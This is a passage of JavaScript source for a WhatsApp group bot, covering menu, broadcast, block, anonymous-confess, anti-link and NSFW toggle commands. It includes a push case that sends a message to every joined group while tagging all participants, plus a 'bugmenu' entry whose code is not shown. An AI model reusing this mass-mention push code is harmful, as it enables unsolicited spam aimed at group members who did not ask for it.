              } teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`
            );
          await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_");
          let getGroups = await XeonBotInc.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          for (let xnxx of anu) {
            let metadat72 = await XeonBotInc.groupMetadata(xnxx);
            let participanh = await metadat72.participants;
            if (/image/.test(mime)) {
              media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
              mem = await uptotelegra(media);
              await XeonBotInc.sendMessage(xnxx, {
                image: { url: mem },
                caption: text.split("|")[0],
                mentions: participanh.map((a) => a.id),
              });
              await sleep(text.split("|")[1]);
            } else {
              await XeonBotInc.sendMessage(xnxx, {
                text: text.split("|")[0],
                mentions: participanh.map((a) => a.id),
              });
              await sleep(text.split("|")[1]);
            }
          }
          reply("*SUCCESFUL ✅*");
        }
        break;
      case "credit":
        {
          me = m.sender;
          teks = `*thanks to*
> _all creator bot_
> _penyedia Rest Api_`;
          sendXeonBotIncMessage(from, {
            text: teks,
            mentions: [sender],
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: defaultpp,
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "list":
      case "menu":
      case "bot":
        {
          await loading();
          let ownernya = ownernomer + "@s.whatsapp.net";
          let me = m.sender;
          let timestampe = speed();
          let latensie = speed() - timestampe;
          xeonezy = `_hai ${pushname} i'm ${global.botname}_
- Bot Name : *${global.botname}*
- Author : _${global.ownernumber}_
- Version : *0.1.1*
- Type Baiyles : *MultiDevice*
- Runtime : ${runtime(process.uptime())}

*L I S T   M E N U *
┌ .*ᴀʟʟᴍᴇɴᴜ*
│ .*ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ*
│ .*ꜰᴜɴᴍᴇɴᴜ*
│ .*ɢʀᴏᴜᴘᴍᴇɴᴜ*
│ .*ᴏᴡɴᴇʀᴍᴇɴᴜ*
│ .*ᴏᴛʜᴇʀᴍᴇɴᴜ*
│ .*ʙᴜɢᴍᴇɴᴜ*
│ .*ᴀɴᴛɪᴍᴇɴᴜ*
│ .*ᴘᴜꜱʜᴍᴇɴᴜ*
└ .*ᴄʀᴇᴅɪᴛ*
`;
          let ments = [ownernya, me, mark];
          XeonBotInc.sendMessage(
            from,
            {
              text: xeonezy,
              contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                mentionedJid: [sender],
                externalAdReply: {
                  showAdAttribution: true,
                  renderLargerThumbnail: true,
                  title: botname,
                  containsAutoReply: true,
                  mediaType: 1,
                  thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                  mediaUrl: `${wagc}`,
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "allmenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "All Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${allmenu(prefix, hituet)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "pushmenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "push Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${pushmenu(prefix, hituet)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "antimenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "Anti Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${antimenu(prefix, hituet)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "bugmenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "Bug Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${bugmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
        break;
      case "ownermenu":
        {
          await loading;
          var unicorn = await getBuffer(picak + "Owner Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "othermenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "Other Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "downloadmenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "Download Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "groupmenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "Group Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "funmenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "Fun Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;

      case "animemenu":
        {
          await loading();
          var unicorn = await getBuffer(picak + "Anime Menu");
          sendXeonBotIncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "tourl":
        {
          replygcxeon(mess.wait);
          let {
            UploadFileUgu,
            webp2mp4File,
            TelegraPh,
          } = require("./lib/uploader");
          let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg);
          if (/image/.test(mime)) {
            let anu = await TelegraPh(media);
            replygcxeon(util.format(anu));
          } else if (!/image/.test(mime)) {
            let anu = await UploadFileUgu(media);
            replygcxeon(util.format(anu));
          }
          await fs.unlinkSync(media);
        }
        break;
      case "sc":
      case "script":
      case "donate":
      case "donate":
      case "cekupdate":
      case "updatebot":
      case "cekbot":
      case "sourcecode":
        {
          me = m.sender;
          teks = `Script Ini Dijual\nHubungi @${global.ownernumber} Untuk Info Lebih Lanjut`;
          sendXeonBotIncMessage(from, {
            text: teks,
            mentions: [sender],
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: defaultpp,
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "tts":
        {
          if (!text) replygcxeon(`Example : ${prefix + command} text`);
          let tts = await fetchJson(
            `https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`
          );
          XeonBotInc.sendMessage(
            m.chat,
            {
              audio: { url: tts.result },
              mimetype: "audio/mp4",
              ptt: true,
              fileName: `${text}.mp3`,
            },
            { quoted: m }
          );
        }
        break;
      case "ss":
      case "ssweb":
        {
          if (!q) return replygcxeon(`Example ${prefix + command} link`);
          replygcxeon(mess.wait);
          let krt = await scp1.ssweb(q);
          XeonBotInc.sendMessage(
            from,
            { image: krt.result, caption: mess.succes },
            { quoted: m }
          );
        }
        break;
      case "join":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (!text) return replygcxeon(`Contoh ${prefix + command} linkgc`);
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return replygcxeon("Link Invalid!");
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          await XeonBotInc.groupAcceptInvite(result)
            .then((res) => replygcxeon(jsonformat(res)))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "listpc":
        {
          let anulistp = await store.chats
            .all()
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`;
          for (let i of anulistp) {
            let nama = store.messages[i].array[0].pushName;
            teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${
              i.split("@")[0]
            }\n${themeemoji} *Chat :* https://wa.me/${
              i.split("@")[0]
            }\n\n────────────────────────\n\n`;
          }
          XeonBotInc.sendTextWithMentions(m.chat, teks, m);
        }
        break;
      case "listgc":
        {
          let anulistg = await store.chats
            .all()
            .filter((v) => v.id.endsWith("@g.us"))
            .map((v) => v.id);
          let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`;
          for (let i of anulistg) {
            let metadata = await XeonBotInc.groupMetadata(i);
            teks += `${themeemoji} *Name :* ${
              metadata.subject
            }\n${themeemoji} *Owner :* ${
              metadata.owner !== undefined
                ? "@" + metadata.owner.split`@`[0]
                : "Unknown"
            }\n${themeemoji} *ID :* ${
              metadata.id
            }\n${themeemoji} *Made :* ${moment(metadata.creation * 1000)
              .tz("Asia/Kolkata")
              .format("DD/MM/YYYY HH:mm:ss")}\n${themeemoji} *Member :* ${
              metadata.participants.length
            }\n\n────────────────────────\n\n`;
          }
          XeonBotInc.sendTextWithMentions(m.chat, teks, m);
        }
        break;
      case "ping":
      case "botstatus":
      case "statusbot":
        {
          const used = process.memoryUsage();
          const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
              (last, type) => last + cpu.times[type],
              0
            );
            return cpu;
          });
          const cpu = cpus.reduce(
            (last, cpu, _, { length }) => {
              last.total += cpu.total;
              last.speed += cpu.speed / length;
              last.times.user += cpu.times.user;
              last.times.nice += cpu.times.nice;
              last.times.sys += cpu.times.sys;
              last.times.idle += cpu.times.idle;
              last.times.irq += cpu.times.irq;
              return last;
            },
            {
              speed: 0,
              total: 0,
              times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
              },
            }
          );
          let timestamp = speed();
          let latensi = speed() - timestamp;
          neww = performance.now();
          oldd = performance.now();
          respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${
            oldd - neww
          } _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}

${
  cpus[0]
    ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
  .map(
    (cpu, i) =>
      `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
        cpu.times
      )
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}`
  )
  .join("\n\n")}`
    : ""
}
                `.trim();
          replygcxeon(respon);
        }
        break;
      case "bctext":
      case "broadcasttext":
      case "broadcast":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (!q) return replygcxeon(`Enter text`);
          const data = await store.chats.all();
          for (let i of data) {
            XeonBotInc.sendMessage(i.id, {
              text: `${ownername}'s Broadcast\n\nMessage : ${q}`,
            });
            await sleep(1000);
          }
        }
        break;
      case "block":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await XeonBotInc.updateBlockStatus(users, "block")
            .then((res) => replygcxeon(jsonformat(res)))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "unblock":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await XeonBotInc.updateBlockStatus(users, "unblock")
            .then((res) => replygcxeon(jsonformat(res)))
            .catch((err) => replygcxeon(jsonformat(err)));
        }
        break;
      case "listblock":
      case "listban":
      case "blocklist":
      case "banlist":
        {
          const lisben = "Total Block: " + banUser.length;
          replygcxeon(lisben);
        }
        break;
      case "menfes":
      case "confess":
        if (Object.values(anon.anonymous).find((p) => p.check(sender)))
          return replygcxeon("You are still in the room");
        if (m.isGroup) return replygcxeon(mess.private);
        if (args.length < 1)
          return replygcxeon(
            `Use ${prefix + command} number|your message\nExample ${
              prefix + command
            } ${ownernumber}|Hi Owner`
          );
        if (text > 700) return replygcxeon(`The text is too long`);
        num = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        pesan = q.split("|")[1];
        let cekno = await XeonBotInc.onWhatsApp(num);
        if (cekno.length == 0)
          return replygcxeon(
            `Enter a valid and registered number on WhatsApp!!!`
          );
        if (num === m.sender)
          return replygcxeon(`Cannot Confess To Own Number!!!`);
        if (num === botNumber)
          return replygcxeon(`Can't Confess to bot number!!!`);
        var nomor = m.sender;

        const xeonconfesmsg = `Hi, I'm a bot. Someone sent a message to you.

Someone your friend
(Secret Sender)

-------------------------------------->

💌 Message : ${pesan}

-------------------------------------->`;

        await XeonBotInc.sendMessage(
          num,
          {
            text: xeonconfesmsg,
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: ` ${global.botname}`,
                body: `${ownername}`,
                previewType: "PHOTO",
                thumbnailUrl: ``,
                thumbnail: ``,
                sourceUrl: `${wagc}`,
              },
            },
          },
          { quoted: m }
        );

        await XeonBotInc.sendMessage(
          num,
          {
            text: `You can also reply to the message by sending a message, if you don't want to reply, please type .leave and enter send button`,
          },
          { quoted: m }
        );
        lidt = `Success Sending Message
👤 From : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 To : wa.me/${q.split("|")[0].replace(/[^0-9]/g, "")}

⬡──⬡─────────⬡──⬡

Your Message : ${pesan}

⬡──⬡─────────⬡──⬡`;
        var check = Object.values(anon.anonymous).find(
          (p) => p.state == "WAITING"
        );
        if (!check) {
          anon.createRoom(sender, num);
          console.log("[ CONFESS ] Creating room for: " + sender);
          return replygcxeon(lidt);
        }
        break;
      case "afk":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!text)
            return replygcxeon(`Example ${prefix + command} want to sleep`);
          let user = global.db.users[m.sender];
          user.afkTime = +new Date();
          user.afkReason = args.join(" ");
          replygcxeon(
            `${m.pushName} Has Gone AFK\nReason : ${
              args.join(" ") ? args.join(" ") : ""
            }`
          );
        }
        break;
      case "resetlinkgc":
      case "resetlinkgroup":
      case "resetlinkgrup":
      case "revoke":
      case "resetlink":
      case "resetgrouplink":
      case "resetgclink":
      case "resetgruplink":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          XeonBotInc.groupRevokeInvite(m.chat);
        }
        break;
      case "react":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          reactionMessage = {
            react: {
              text: args[0],
              key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
            },
          };
          XeonBotInc.sendMessage(m.chat, reactionMessage);
        }
        break;
      case "editinfo":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!q)
            return replygcxeon(
              `Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`
            );
          if (args[0] == "close") {
            XeonBotInc.groupSettingUpdate(from, "announcement");
            replygcxeon(
              `Success Allows Only Admins To Send Messages To This Group`
            );
          } else if (args[0] == "open") {
            XeonBotInc.groupSettingUpdate(from, "not_announcement");
            replygcxeon(
              `Success Allows All Participants To Send Messages To This Group`
            );
          } else {
            replygcxeon(
              `Type Command ${command} _pptions_\nOptions : Close & Open\nExample : ${command} close`
            );
          }
        }
        break;
      case "antivirtex":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (antiVirtex) return replygcxeon("Already activated");
            ntvirtex.push(from);
            fs.writeFileSync(
              "./database/antivirus.json",
              JSON.stringify(ntvirtex)
            );
            replygcxeon("Success in turning on antivirus in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!antiVirtex) return replygcxeon("Already deactivated");
            let off = ntvirtex.indexOf(from);
            ntvirtex.splice(off, 1);
            fs.writeFileSync(
              "./database/antivirus.json",
              JSON.stringify(ntvirtex)
            );
            replygcxeon("Success in turning off antivirus this group");
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "nsfw":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiNsfw) return replygcxeon("Already activated");
            ntnsfw.push(from);
            fs.writeFileSync("./database/nsfw.json", JSON.stringify(ntnsfw));
            replygcxeon("Success in turning on nsfw in this group");
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiNsfw) return replygcxeon("Already deactivated");
            let off = ntnsfw.indexOf(from);
            ntnsfw.splice(off, 1);
            fs.writeFileSync("./database/nsfw.json", JSON.stringify(ntnsfw));
            replygcxeon("Success in turning off nsfw in this group");
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkyoutubevideo":
      case "antilinkyoutubevid":
      case "antilinkytvid":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkYoutubeVid) return replygcxeon("Already activated");
            ntilinkytvid.push(from);
            fs.writeFileSync(
              "./database/antilinkytvideo.json",
              JSON.stringify(ntilinkytvid)
            );
            replygcxeon(
              "Success in turning on youtube video antilink in this group"
            );
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkYoutubeVid) return replygcxeon("Already deactivated");
            let off = ntilinkytvid.indexOf(from);
            ntilinkytvid.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkytvideo.json",
              JSON.stringify(ntilinkytvid)
            );
            replygcxeon(
              "Success in turning off youtube video antilink in this group"
            );
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkyoutubech":
      case "antilinkyoutubechannel":
      case "antilinkytch":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkYoutubeChannel) return replygcxeon("Already activated");
            ntilinkytch.push(from);
            fs.writeFileSync(
              "./database/antilinkytchannel.json",
              JSON.stringify(ntilinkytch)
            );
            replygcxeon(
              "Success in turning on youtube channel antilink in this group"
            );
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkYoutubeChannel)
              return replygcxeon("Already deactivated");
            let off = ntilinkytch.indexOf(from);
            fs.writeFileSync(
              "./database/antilinkytchannel.json",
              JSON.stringify(ntilinkytch)
            );
            ntilinkytch.splice(off, 1);
            replygcxeon(
              "Success in turning off youtube channel antilink in this group"
            );
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkinstagram":
      case "antilinkig":
      case "antilinkinsta":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkInstagram) return replygcxeon("Already activated");
            ntilinkig.push(from);
            fs.writeFileSync(
              "./database/antilinkinstagram.json",
              JSON.stringify(ntilinkig)
            );
            replygcxeon(
              "Success in turning on instagram antilink in this group"
            );
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkInstagram) return replygcxeon("Already deactivated");
            let off = ntilinkig.indexOf(from);
            ntilinkig.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkinstagram.json",
              JSON.stringify(ntilinkig)
            );
            replygcxeon(
              "Success in turning off instagram antilink in this group"
            );
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinkfacebook":
      case "antilinkfb":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkFacebook) return replygcxeon("Already activated");
            ntilinkfb.push(from);
            fs.writeFileSync(
              "./database/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            replygcxeon(
              "Success in turning on facebook antilink in this group"
            );
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkFacebook) return replygcxeon("Already deactivated");
            let off = ntilinkfb.indexOf(from);
            ntilinkfb.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinkfacebook.json",
              JSON.stringify(ntilinkfb)
            );
            replygcxeon(
              "Success in turning off facebook antilink in this group"
            );
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
      case "antilinktelegram":
      case "antilinktg":
        {
          if (!m.isGroup) return replygcxeon(mess.group);
          if (!isBotAdmins) return replygcxeon(mess.botAdmin);
          if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin);
          if (args[0] === "on") {
            if (AntiLinkTelegram) return replygcxeon("Already activated");
            ntilinktg.push(from);
            fs.writeFileSync(
              "./database/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            replygcxeon(
              "Success in turning on telegram antilink in this group"
            );
            var groupe = await XeonBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XeonBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkTelegram) return replygcxeon("Already deactivated");
            let off = ntilinktg.indexOf(from);
            ntilinktg.splice(off, 1);
            fs.writeFileSync(
              "./database/antilinktelegram.json",
              JSON.stringify(ntilinktg)
            );
            replygcxeon(
              "Success in turning off telegram antilink in this group"
            );
          } else {
            await replygcxeon(
              `Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable`
            );
          }
        }
        break;
